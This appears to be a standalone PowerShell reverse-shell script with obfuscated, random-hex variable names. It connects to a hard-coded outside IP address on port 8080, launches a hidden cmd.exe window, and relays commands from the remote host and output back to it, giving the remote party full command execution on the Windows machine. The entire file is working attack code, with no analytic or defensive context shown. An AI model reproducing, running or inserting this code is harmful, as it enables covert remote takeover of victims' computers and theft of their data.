function cleanup {
    if ($22c77368b2844c34ae0d2f339c2cc3f1.Connected -eq $true) {$22c77368b2844c34ae0d2f339c2cc3f1.Close()}
    if ($1f9aaba448754394bf9ea953f22f9b83 -and $1f9aaba448754394bf9ea953f22f9b83.HasExited -eq $false) {$1f9aaba448754394bf9ea953f22f9b83.Close()}
    exit
}

$716b9bb93e86452390c28a5dad920c51 = '13.201.46.41'
$c3b6907d915b43e98b1f524ffef1317b = '8080'
$22c77368b2844c34ae0d2f339c2cc3f1 = New-Object system.net.sockets.tcpclient
$22c77368b2844c34ae0d2f339c2cc3f1.connect($716b9bb93e86452390c28a5dad920c51,$c3b6907d915b43e98b1f524ffef1317b)
$9c286da7150540878d70206899151e44 = $22c77368b2844c34ae0d2f339c2cc3f1.GetStream()
$f124dcc092bc478891f5bc90afc36341 = New-Object System.Byte[] $22c77368b2844c34ae0d2f339c2cc3f1.ReceiveBufferSize
$1f9aaba448754394bf9ea953f22f9b83 = New-Object System.Diagnostics.Process

# Setup the process start info
$1f9aaba448754394bf9ea953f22f9b83.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$1f9aaba448754394bf9ea953f22f9b83.StartInfo.RedirectStandardInput = $true
$1f9aaba448754394bf9ea953f22f9b83.StartInfo.RedirectStandardOutput = $true
$1f9aaba448754394bf9ea953f22f9b83.StartInfo.UseShellExecute = $false
$1f9aaba448754394bf9ea953f22f9b83.StartInfo.CreateNoWindow = $true  # This will prevent the command prompt window from appearing

$1f9aaba448754394bf9ea953f22f9b83.Start()
$bda2c06f82c847bfa066e075e3d13168 = $1f9aaba448754394bf9ea953f22f9b83.StandardInput
$3a72d108c8dd463c95dd21b87d960267 = $1f9aaba448754394bf9ea953f22f9b83.StandardOutput

Start-Sleep 1
$353cdb9494a14a7f833f94ac1d543d8b = New-Object System.Text.AsciiEncoding
$4743f73e0f1d4e96bd210d8b55a93739 = ""

while ($3a72d108c8dd463c95dd21b87d960267.Peek() -ne -1) {
    $4743f73e0f1d4e96bd210d8b55a93739 += $353cdb9494a14a7f833f94ac1d543d8b.GetString($3a72d108c8dd463c95dd21b87d960267.Read())
}

$9c286da7150540878d70206899151e44.Write($353cdb9494a14a7f833f94ac1d543d8b.GetBytes($4743f73e0f1d4e96bd210d8b55a93739), 0, $4743f73e0f1d4e96bd210d8b55a93739.Length)
$4743f73e0f1d4e96bd210d8b55a93739 = $null
$e6038d916b6b48b5abf8256ba7f2923c = $false
$3829cf3b28704ce38c1203b1881a3f4d = 0

while (-not $e6038d916b6b48b5abf8256ba7f2923c) {
    if ($22c77368b2844c34ae0d2f339c2cc3f1.Connected -ne $true) {cleanup}
    $b5a616284a4f462daa7cb39fe79fe74c = 0
    $89a92fdc16a74410a391d78290f3f602 = 1

    while (($89a92fdc16a74410a391d78290f3f602 -gt 0) -and ($b5a616284a4f462daa7cb39fe79fe74c -lt $f124dcc092bc478891f5bc90afc36341.Length)) {
        $538fe26098784e9286a7a0f16bcd76be = $9c286da7150540878d70206899151e44.Read($f124dcc092bc478891f5bc90afc36341, $b5a616284a4f462daa7cb39fe79fe74c, $f124dcc092bc478891f5bc90afc36341.Length - $b5a616284a4f462daa7cb39fe79fe74c)
        $b5a616284a4f462daa7cb39fe79fe74c += $538fe26098784e9286a7a0f16bcd76be
        if ($b5a616284a4f462daa7cb39fe79fe74c -and ($f124dcc092bc478891f5bc90afc36341[0..$($b5a616284a4f462daa7cb39fe79fe74c-1)] -contains 10)) {break}
    }

    if ($b5a616284a4f462daa7cb39fe79fe74c -gt 0) {
        $2315d8ff87f04071a1a07ae12de925f0 = $353cdb9494a14a7f833f94ac1d543d8b.GetString($f124dcc092bc478891f5bc90afc36341, 0, $b5a616284a4f462daa7cb39fe79fe74c)
        $bda2c06f82c847bfa066e075e3d13168.Write($2315d8ff87f04071a1a07ae12de925f0)
        Start-Sleep 1

        if ($1f9aaba448754394bf9ea953f22f9b83.HasExited) {cleanup}
        else {
            $4743f73e0f1d4e96bd210d8b55a93739 = $353cdb9494a14a7f833f94ac1d543d8b.GetString($3a72d108c8dd463c95dd21b87d960267.Read())
            while ($3a72d108c8dd463c95dd21b87d960267.Peek() -ne -1) {
                $4743f73e0f1d4e96bd210d8b55a93739 += $353cdb9494a14a7f833f94ac1d543d8b.GetString($3a72d108c8dd463c95dd21b87d960267.Read())
                if ($4743f73e0f1d4e96bd210d8b55a93739 -eq $2315d8ff87f04071a1a07ae12de925f0) {$4743f73e0f1d4e96bd210d8b55a93739 = ''}
            }
            $9c286da7150540878d70206899151e44.Write($353cdb9494a14a7f833f94ac1d543d8b.GetBytes($4743f73e0f1d4e96bd210d8b55a93739), 0, $4743f73e0f1d4e96bd210d8b55a93739.Length)
            $4743f73e0f1d4e96bd210d8b55a93739 = $null
            $2315d8ff87f04071a1a07ae12de925f0 = $null
        }
    } else {
        cleanup
    }
}

